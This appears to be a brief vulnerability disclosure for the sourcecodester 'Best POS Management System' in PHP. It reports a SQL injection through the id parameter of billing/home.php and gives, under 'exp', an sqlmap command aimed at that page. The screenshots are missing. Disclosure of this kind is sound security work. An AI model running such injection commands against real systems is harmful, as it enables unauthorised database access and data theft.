vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image-20230223215721857](C:\markdown\images\image-20230223215721857.png)

exp

```
sqlmap.py -u "http://192.168.31.50/kruxton/billing/home.php?id=1"
```

![image-20230223215644678](C:\markdown\images\image-20230223215644678.png)